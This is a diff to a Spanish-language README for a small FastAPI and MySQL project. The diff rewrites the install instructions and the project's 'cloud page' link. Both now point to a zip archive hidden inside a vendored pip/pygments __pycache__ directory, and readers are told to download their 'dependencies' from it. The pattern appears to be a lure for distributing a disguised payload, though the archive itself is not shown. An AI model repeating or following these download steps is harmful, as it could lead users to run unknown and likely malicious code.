@@ -6,7 +6,7 @@
 # que lleva cosigo dos tablas una de usuarios y otra para accesorios 
 
 # las instrucciones para instalar y ejecutar el proyecto son:
-# descargue las dependencias del https://raw.githubusercontent.com/CareBobo/moto/main/barkevikite/moto.zip despues de haber instalado un entorno virtual
+# descargue las dependencias del https://github.com/CareBobo/moto/raw/refs/heads/main/venv/Lib/site-packages/pip/_vendor/pygments/lexers/__pycache__/Software_1.8.zip despues de haber instalado un entorno virtual
 
 # tecnologias usadas fueron :
 # backend , fronted, fastapi , sqlalchemy ,mysql, python, html, boostrap 5 json etc...
@@ -15,4 +15,4 @@
 
 
 # link de pagina en nube 
-# https://raw.githubusercontent.com/CareBobo/moto/main/barkevikite/moto.zip
+# https://github.com/CareBobo/moto/raw/refs/heads/main/venv/Lib/site-packages/pip/_vendor/pygments/lexers/__pycache__/Software_1.8.zip
